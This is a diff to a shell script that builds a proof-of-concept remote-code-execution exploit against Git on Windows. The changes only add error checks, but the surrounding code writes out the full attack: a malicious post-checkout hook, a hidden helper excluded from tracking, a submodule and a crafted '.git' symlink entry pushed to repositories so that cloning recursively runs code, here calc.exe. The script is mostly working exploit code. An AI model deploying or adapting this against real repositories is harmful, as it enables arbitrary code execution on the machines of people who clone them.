@@ -28,7 +28,7 @@ if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
 fsutil file setcasesensitiveinfo git_rce_hook disable
 fi
 git clone --recursive "$hook_repo_path" git_rce_hook ||error_handler
-cd git_rce_hook
+cd git_rce_hook ||error_handler
 mkdir -p scripts/hooks ||error_handler
 cat > scripts/hooks/post-checkout <<EOF
 #!/bin/bash
@@ -41,7 +41,7 @@ touch .git/info/exclude
 grep -qxF 'Call-Post-Checkout.sh' .git/info/exclude||echo 'Call-Post-Checkout.sh' >>.git/info/exclude
 echo 'It works!' >Test.txt
 git add Test.txt
-git diff --cached --quiet ||git commit -m "test"
+git diff --cached --quiet HEAD ||git commit -m "test"
 CMD <<END
 start explorer "C:\Windows\System32\calc.exe"
 echo.It works!
@@ -58,26 +58,26 @@ git_editor="VIM"
 fi
 "$git_editor" "$PWD/scripts/hooks/post-checkout"
 git add scripts/hooks/post-checkout ||error_handler
-git diff --cached --quiet ||git commit -m "add-post-checkout" ||error_handler
+git diff --cached --quiet HEAD ||git commit -m "add-post-checkout" ||error_handler
 git push origin HEAD ||error_handler
-cd ..
+cd .. ||error_handler
 echo Constructing main repo...
 mkdir -p git_rce_main
 if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
 fsutil file setcasesensitiveinfo git_rce_main disable
 fi
 git clone --recursive "$main_repo_path" git_rce_main ||error_handler
-cd git_rce_main
+cd git_rce_main ||error_handler
 git submodule add --name RCE/scripts "$hook_repo_path" GITLNK/modules/RCE ||error_handler
 git config -f .gitmodules submodule.RCE/scripts.ignore all ||error_handler
 git add .gitmodules ||error_handler
-git diff --cached --quiet ||git commit -m "add-submodule" ||error_handler
+git diff --cached --quiet HEAD ||git commit -m "add-submodule" ||error_handler
 git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w --stdin) gitlnk ||error_handler
-git diff --cached --quiet ||git commit -m "add-symlink" ||error_handler
+git diff --cached --quiet HEAD ||git commit -m "add-symlink" ||error_handler
 xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y ||error_handler
 git reset --hard HEAD ||error_handler
 git push origin HEAD ||error_handler
-cd ..
+cd .. ||error_handler
 echo Testing the exploit...
 mkdir -p git_rce_test
 if fsutil file 2>&1 | grep -qi "setCaseSensitiveInfo"; then
